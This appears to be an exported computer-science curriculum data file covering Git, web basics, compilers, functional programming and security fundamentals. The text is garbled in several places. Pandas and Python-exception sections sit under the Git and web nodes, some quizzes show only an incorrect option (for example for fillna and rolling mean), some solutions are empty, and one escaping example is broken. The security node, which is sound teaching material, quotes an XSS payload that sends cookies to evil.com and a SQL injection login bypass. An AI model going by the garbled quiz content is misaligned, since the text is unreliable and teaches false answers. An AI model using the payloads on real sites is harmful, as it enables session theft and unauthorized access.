name: Computer Science
description: Learn to think like a programmer. From Python basics to algorithms and system design.

nodes.name: Git & Version Control
nodes.description: Track changes, collaborate, and never lose your work. Essential for every developer.
nodes.whyItMatters: Git is the industry standard for code collaboration. Without it, you can't work on teams, contribute to open source, or safely experiment with code.
practiceProblems: Initialize a repo and make 3 commits
Create a branch, make changes, merge back to main
Resolve a simple merge conflict
View commit history and revert a commit

resources.title: Git Concepts (not commands)
resources.whyHelpful: Conceptual breakdown of git internals — commits as snapshots not diffs, branches as movable pointers, the three-tree architecture (working directory, staging, repository), and merge vs rebase explained visually.

resources.title: Learn Git Branching
resources.whyHelpful: Interactive practice environment for Learn Git Branching. Hands-on coding reinforces concepts better than passive reading.

resources.title: Oh Shit, Git!?
resources.whyHelpful: Practical Git recovery guide for when things go wrong — undoing commits, reverting merges, and fixing branch mistakes. Every developer's emergency reference.

resources.title: Pro Git Book (free)
resources.whyHelpful: Book on Pro Git Book (free). Authoritative reference that can be revisited as your understanding grows.

workedExamples.problem: Initialize a new Git repo and make 3 commits tracking changes to a Python file.
workedExamples.solution:
mkdir myproject && cd myproject
git init
echo '# Step 1: initial version' > main.py
git add main.py
git commit -m "Initial commit"
echo ''
echo '# Step 2: add function' >> main.py
git add main.py
git commit -m "Add greeting function"
workedExamples.explanation: Git tracks changes in three stages: working directory (your files), staging area (git add), and repository (git commit). This three-stage model lets you carefully curate what goes into each commit.

workedExamples.problem: Create a feature branch, make changes, and merge back to main. Then resolve a simple merge conflict.
workedExamples.solution:
git checkout -b feature-login
echo 'def login(): pass' > auth.py
git add auth.py && git commit -m "Add login stub"
git checkout main
echo 'def logout(): pass' > auth.py
git add auth.py && git commit -m "Add logout on main"
git merge feature-login
# Merge conflict! Edit auth.py to include BOTH functions, then:
git add auth.py && git commit -m "Merge feature-login: resolve conflict"
workedExamples.explanation: Merge conflicts happen when two branches modify the same file. Git marks the conflict with <<<<<<<, =======, >>>>>>> markers. You must manually choose which version to keep (or combine both). Understanding this is essential for team collaboration.

workedExamples.problem: You pushed a commit with a typo that broke the app. Use git revert to safely undo it without rewriting history. Also, use git log --oneline to audit the last 5 changes.
workedExamples.solution:
git log --oneline -5
# Shows: abc1234 (HEAD -> main) Fix typo in homepage
#           def5678 Add user profile page
#           ... (more history)
# The bad commit is abc1234. Safely revert it:
git revert abc1234
# Git opens an editor for the revert commit message. Save and exit.
# A NEW commit is created that undoes the changes. The original commit stays in history.
# Verify: git log --oneline -3 should show the revert commit.
# Compare: git diff abc1234^ abc1234 shows what was changed vs original.
workedExamples.explanation: git revert creates a NEW commit that undoes changes from a specific commit. Unlike git reset (which rewrites history), revert is safe for shared branches because it preserves the full timeline. Always use --oneline for readable history, and diff ^ to compare parent/child commits.

commonMistakes: Not handling NaN values — pct_change() and rolling() create NaN for the first rows. Use .fillna() or .dropna() before further calculations.
Confusing index-based vs label-based selection — .loc uses labels, .iloc uses integer positions. Mixing them up causes subtle bugs.
Modifying a DataFrame while iterating over it — vectorized operations are faster and safer. Avoid loops when possible.

quiz.question: What does df['Price'].pct_change() calculate?
options: The percentage change from the previous row
quiz.explanation: pct_change() computes the percentage change between consecutive rows. It's essential for calculating daily returns in financial time series analysis.

quiz.question: What is the purpose of .rolling(window=5).mean()?
options: To find the sum over 5 days
quiz.explanation: rolling(window=5) creates a rolling window of 5 rows, and .mean() computes the average within each window. This produces a 5-period moving average, a common technical indicator.

quiz.question: What does df.fillna(0) do to a DataFrame with missing values?
options: Fills missing values with the column mean
quiz.explanation: fillna(0) replaces all NaN (Not a Number) values with 0. This is useful for preprocessing financial data where missing prices can break calculations.

quiz.question: What is the purpose of 'git branch' and 'git merge'?
options: To create a separate line of development and later combine it back
To push code to a remote server
quiz.explanation: git branch creates a separate line of development so you can work on features without affecting the main code. git merge combines the changes from one branch back into another. This is the core workflow for collaborative development.

nodes.name: Web Development Basics
nodes.description: HTML, CSS, and JavaScript. Build your first interactive webpage.
nodes.whyItMatters: The web is the most accessible platform. Every app, dashboard, and tool you use runs on these three technologies. Build your own portfolio, blog, or tool.
practiceProblems: Build a personal portfolio page with HTML/CSS
Add a button that changes text color with JS
Create a responsive navigation bar
Build a to-do list that adds/removes items

resources.title: freeCodeCamp: Responsive Web Design
resources.whyHelpful: FreeCodeCamp's project-based tutorials with interactive coding challenges. Great for applying theoretical knowledge in practice.

resources.title: MDN Web Docs
resources.whyHelpful: Mozilla's comprehensive web development learning path covering HTML, CSS, JavaScript, and APIs. The gold standard reference for frontend web technologies.

resources.title: JavaScript DOM Manipulation
resources.whyHelpful: Live coding walkthrough of document.querySelector, getElementById, createElement, event listeners, and DOM traversal — the essential toolkit for making web pages interactive.

workedExamples.problem: Create a simple HTML page with a heading, paragraph, and a button. When the button is clicked, change the paragraph text using JavaScript DOM manipulation.
workedExamples.solution:
My First App

Hello, world!
workedExamples.explanation: The DOM (Document Object Model) represents HTML as a tree of objects. getElementById finds a specific element, and textContent changes its content. onclick binds a JavaScript function to the click event. This is the foundation of all interactive web applications.

workedExamples.problem: Build a responsive card layout using CSS flexbox. Cards should be in a row on desktop but stack vertically on mobile.
workedExamples.explanation: flex-wrap: wrap lets items flow to the next line. flex: 1 1 300px means cards grow to fill space, shrink if needed, and have a base width of 300px. Media queries adapt the layout for different screen sizes — this is responsive design fundamentals.

workedExamples.problem: Build a to-do list app: add items via an input field, display them in a list, and allow deleting items by clicking a 'Remove' button next to each.
workedExamples.explanation: This pattern — create elements dynamically, attach event handlers, append to the DOM — is the foundation of every interactive web app. createElement creates new nodes, appendChild inserts them into the document tree, and inline event handlers (onclick) wire up user interaction. Modern apps use frameworks like React, but underneath it all, these same DOM APIs are at work.

commonMistakes: Using bare 'except:' — this catches everything including KeyboardInterrupt. Always catch specific exceptions like ValueError, FileNotFoundError.
Catching an exception but doing nothing — this makes debugging a nightmare. At minimum, log the error.
Using exceptions for normal control flow — checking if a file exists with os.path.exists() is cleaner than catching FileNotFoundError in some cases.

quiz.question: What is wrong with using 'except:' without specifying an exception type?
options: It catches all exceptions including system interrupts, hiding bugs
quiz.explanation: A bare except catches everything, including KeyboardInterrupt (Ctrl+C) and SystemExit. This makes programs hard to stop and hides real bugs. Always catch specific exceptions.

quiz.question: What exception is raised when you try to open a file that doesn't exist?
quiz.explanation: FileNotFoundError is raised when trying to open a file that doesn't exist (in Python 3). In Python 2, this was IOError.

quiz.question: What does HTML stand for?
quiz.explanation: HTML (Hyper Text Markup Language) is the standard markup language for creating web pages. It defines the structure and content of the web.

quiz.question: What is the CSS box model?
options: A way to create 3D boxes on a webpage
The layout system where each element has content, padding, border, and margin
A JavaScript framework for building layouts
A method for centering elements using flexbox
quiz.explanation: The CSS box model describes how every HTML element is rendered as a rectangular box with four layers: content (innermost), padding, border, and margin (outermost). Understanding this is essential for precise layout control.

nodes.name: Compiler Design Basics
nodes.description: How programming languages are translated into machine code. Lexing, parsing, code generation, and optimization. Understand what happens when you hit 'run'.
keyConcepts: Semantic analysis: type checking and scope
Code optimization: constant folding, dead code elimination
Garbage collection: reference counting vs mark-and-sweep
nodes.whyItMatters: Understanding compilers helps you write better code. When you know how Python's interpreter works, you understand why some operations are slow and others are fast. Compilers are one of the great achievements of computer science — they let us write human-readable code that runs at machine speed.
practiceProblems: Write a lexer that tokenizes a simple arithmetic expression
Draw the AST for: if (x > 0) { y = x * 2 } else { y = 0 }
Explain why JIT compilation can be faster than ahead-of-time compilation
Implement a simple recursive descent parser for arithmetic expressions

resources.title: Crafting Interpreters (Bob Nystrom)
resources.whyHelpful: The best free book on building interpreters and compilers. Walks you through building a complete language from scratch.

resources.title: Stanford CS143: Compilers
resources.whyHelpful: Stanford's compiler course. Covers lexical analysis, parsing, semantic analysis, and code generation.

resources.title: LLVM Tutorial
resources.whyHelpful: Tutorial on building a compiler using LLVM. Covers lexing, parsing, code generation, and optimization.

resources.title: Abdul Bari: Compiler Design
resources.whyHelpful: Clear video lectures on compiler design topics.

quiz.question: What is the first phase of compilation?
quiz.explanation: Lexical analysis (lexing) is the first phase: the lexer reads source code and produces tokens.

quiz.question: What is an Abstract Syntax Tree (AST)?
options: A tree representation of the syntactic structure of source code
quiz.explanation: An AST represents the hierarchical structure of source code. Used for semantic analysis, optimization, and code generation.

quiz.question: What is the advantage of JIT (Just-in-Time) compilation?
options: It can optimize based on runtime information
quiz.explanation: JIT compilation compiles code at runtime and can profile which code paths are hot and optimize them aggressively.

quiz.question: What is the difference between reference counting and mark-and-sweep garbage collection?
options: Reference counting frees objects immediately when refcount hits 0; mark-and-sweep traces reachable objects periodically
Mark-and-sweep is only used in Python
quiz.explanation: Reference counting can't handle circular references. Mark-and-sweep can, but causes pauses. Python uses both.

workedExamples.problem: Write a lexer for a simple language that recognizes: numbers, identifiers, operators (+, -, *, /), and parentheses. Tokenize: 'result = (x + 42) * y'
workedExamples.solution: Tokens: [IDENTIFIER('result'), EQUALS, LPAREN, IDENTIFIER('x'), PLUS, NUMBER(42), RPAREN, STAR, IDENTIFIER('y')]. The lexer scans left to right, classifying each character sequence.
workedExamples.explanation: Lexing is the simplest phase of compilation but it's foundational. Every language processor starts with tokenization.

workedExamples.problem: Draw the AST for: if (x > 0) { y = x * 2 } else { y = 0 }
workedExamples.solution: IF_NODE with CONDITION: BINARY_OP(>) with LEFT: IDENTIFIER(x) and RIGHT: NUMBER(0); THEN_BLOCK: ASSIGNMENT with LEFT: IDENTIFIER(y) and RIGHT: BINARY_OP(*) with LEFT: IDENTIFIER(x) and RIGHT: NUMBER(2); ELSE_BLOCK: ASSIGNMENT with LEFT: IDENTIFIER(y) and RIGHT: NUMBER(0).
workedExamples.explanation: ASTs are the backbone of every compiler and interpreter. When you use a linter or IDE autocomplete, they're working with the AST.

workedExamples.problem: Explain how Python's garbage collection works. Analyze: a = []; a.append(a); del a
workedExamples.solution: After del a, the list has refcount 1 (self-reference). Reference counting alone can't free this. Python's cyclic GC periodically traces all container objects, finds unreachable cycles, and frees them.
workedExamples.explanation: This shows why reference counting alone isn't enough. Circular references require a tracing GC.

commonMistakes: Confusing lexing and parsing — lexing produces tokens; parsing produces the AST
Thinking compilation is a single step — it's a pipeline of phases
Ignoring the difference between stack and heap allocation
Assuming garbage collection is free — GC has overhead that matters in performance-critical code

nodes.name: Functional Programming
nodes.description: A different way to think about code. Pure functions, immutability, higher-order functions, and why functional programming is taking over modern software development.
keyConcepts: Pure functions: same input → same output, no side effects
Immutability: data doesn't change, you create new data
Map, filter, reduce: the functional trinity
Recursion as the primary control flow
nodes.whyItMatters: Functional programming is the backbone of modern React (hooks are functions), data processing (Spark, Pandas), and distributed systems (MapReduce). Understanding FP makes you a better programmer in ANY language. Pure functions are easier to test, debug, and parallelize.
practiceProblems: Rewrite a for-loop using map/filter/reduce
Implement a function that returns a closure (function factory)
Write a recursive function to flatten a nested list
Explain why pure functions are easier to test than impure ones

resources.title: Eloquent JavaScript: Higher-Order Functions
resources.whyHelpful: Excellent introduction to functional programming concepts in JavaScript.

resources.title: MIT OCW: Functional Programming (6.005)
resources.whyHelpful: MIT's software construction course emphasizes functional programming, immutability, and specification.

resources.title: Professor Frisby's Mostly Adequate Guide to FP
resources.whyHelpful: Free, entertaining book on functional programming in JavaScript.

resources.title: Haskell Programming (CIS 194)
resources.whyHelpful: Penn's Haskell course — the purest way to learn functional programming.

quiz.question: What makes a function 'pure'?
options: It's written in a functional language
Same input always produces same output, and it has no side effects
quiz.explanation: A pure function is deterministic and has no side effects. Easy to test, cache, and parallelize.

quiz.question: What is immutability?
options: Data structures can't be changed after creation — you create new ones instead
quiz.explanation: Immutability: once created, data can't be changed. This eliminates bugs from unexpected mutations.

quiz.question: What is a higher-order function?
options: A function that runs at a higher priority
A function that takes other functions as arguments or returns a function
quiz.explanation: Higher-order functions treat functions as data. map, filter, and reduce are higher-order functions.

quiz.question: What is currying?
options: Transforming a function that takes multiple arguments into a sequence of functions that each take one argument
quiz.explanation: Currying: f(a, b, c) → f(a)(b)(c). Enables partial application: fix some arguments and reuse the partially-applied function.

workedExamples.problem: Rewrite using map/filter/reduce: Find the sum of squares of even numbers from [1, 2, 3, 4, 5, 6].
workedExamples.solution: [1,2,3,4,5,6].filter(n => n % 2 === 0).map(n => n * n).reduce((sum, n) => sum + n, 0). Steps: filter → [2, 4, 6]. map → [4, 16, 36]. reduce → 56.
workedExamples.explanation: The functional approach is more declarative: you describe WHAT you want, not HOW to compute it.

workedExamples.problem: Implement a 'multiply' function using currying: multiply(2)(3) = 6. Create double = multiply(2).
workedExamples.solution: const multiply = a => b => a * b. const double = multiply(2); double(5) = 10. Currying lets you create specialized functions from general ones.
workedExamples.explanation: Currying is used extensively in functional libraries and in React (higher-order components).

workedExamples.solution: function flatten(arr) { return arr.reduce((acc, item) => acc.concat(Array.isArray(item) ? flatten(item) : item), []). Both recursive and reduce versions produce [1, 2, 3, 4, 5, 6].
workedExamples.explanation: Recursion is the primary control flow in functional programming. reduce can implement any list transformation.

commonMistakes: Thinking FP means no state — FP manages state differently, not by eliminating it
Using recursion without considering stack overflow — deep recursion can blow the call stack
Overusing functional style when a simple loop is clearer — FP is a tool, not a religion
Confusing map and forEach — map transforms and returns; forEach is for side effects

nodes.name: Cybersecurity Fundamentals
nodes.description: How to protect systems and data. Encryption, authentication, common attacks, and defense strategies. Every developer needs to understand security.
keyConcepts: Symmetric vs asymmetric encryption (AES vs RSA)
Hashing: SHA-256, bcrypt, and why you should never store plaintext passwords
Common attacks: SQL injection, XSS, CSRF, phishing
HTTPS and TLS: how secure connections work
nodes.whyItMatters: Security is not optional — it's a fundamental requirement for every system. A single SQL injection can leak millions of user records. Understanding security helps you write safer code, protect your own data, and understand the threats facing every online system.
practiceProblems: Explain why you should use bcrypt instead of SHA-256 for password hashing
Describe how a man-in-the-middle attack works and how TLS prevents it
Write a SQL injection attack and then fix it with parameterized queries
Explain the difference between authentication and authorization

resources.title: OWASP Top 10
resources.whyHelpful: The Open Web Application Security Project's list of the 10 most critical web security risks.

resources.title: Crypto101 (lvh)
resources.whyHelpful: Free introductory book on cryptography. Covers encryption, hashing, key exchange, and common attacks.

resources.title: Harvard CS161: Computer Security
resources.whyHelpful: Harvard's computer security course. Covers software security, web security, cryptography, and network security.

resources.title: PortSwigger: Web Security Academy
resources.whyHelpful: Free, hands-on web security training. Practice exploiting and fixing real vulnerabilities.

quiz.question: What is the main difference between symmetric and asymmetric encryption?
options: Symmetric uses one key; asymmetric uses a public/private key pair
Asymmetric is only used for hashing
quiz.explanation: Symmetric (AES): one shared key. Asymmetric (RSA): public key encrypts, private key decrypts. HTTPS uses both.

quiz.question: Why should you use bcrypt instead of SHA-256 for password hashing?
options: bcrypt is designed to be slow, making brute-force attacks impractical. SHA-256 is fast, which is bad for password hashing.
quiz.explanation: Password hashing needs to be slow. SHA-256 is fast (billions of attempts/sec). bcrypt is slow (thousands of attempts/sec).

quiz.question: What is SQL injection and how do you prevent it?
options: Inserting malicious SQL code through user input. Prevent with parameterized queries.
A way to speed up database queries
quiz.explanation: SQL injection: attacker enters SQL code into a form field that gets executed by the database. Prevention: parameterized queries.

quiz.question: What is the difference between authentication and authorization?
options: Authentication verifies WHO you are (login); authorization verifies WHAT you're allowed to do (permissions)
quiz.explanation: Authentication: verifying identity. Authorization: checking permissions. You must authenticate before you can authorize.

workedExamples.problem: A login form runs: SELECT * FROM users WHERE username='$user' AND password='$pass'. An attacker enters: ' OR '1'='1' --. Explain and fix.
workedExamples.solution: The query becomes always true — attacker logs in as admin. Fix: use parameterized queries. cursor.execute('SELECT * FROM users WHERE username=%s', (user,)). The database treats input as data, never as SQL.
workedExamples.explanation: SQL injection has been the #1 web vulnerability for 20+ years. The fix is simple but requires discipline.

workedExamples.problem: Explain how HTTPS (TLS) prevents a man-in-the-middle attack.
workedExamples.solution: 1. Server sends TLS certificate (public key, signed by CA). 2. Browser verifies the certificate. 3. Browser generates a symmetric session key, encrypts it with the server's public key. 4. All data is encrypted with AES. An attacker can't decrypt without the session key or impersonate the bank without the private key.
workedExamples.explanation: TLS combines asymmetric encryption for key exchange and symmetric encryption for data.

workedExamples.problem: A user posts: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>. Explain the XSS attack and prevention.
workedExamples.solution: XSS: the script runs in other users' browsers, stealing their session cookies. Prevention: (1) Escape user input (< → <). (2) Use CSP headers. (3) Set cookies with HttpOnly flag. (4) Use React (auto-escapes by default).
workedExamples.explanation: XSS is the most common web vulnerability. Never trust user input. Always escape/encode it.

commonMistakes: Storing passwords in plaintext or with weak hashing — always use bcrypt, scrypt, or Argon2
Thinking HTTPS makes you completely secure — TLS protects data in transit, not XSS or SQL injection
Ignoring the human element — social engineering bypasses all technical controls
Rolling your own crypto — never implement your own encryption algorithms
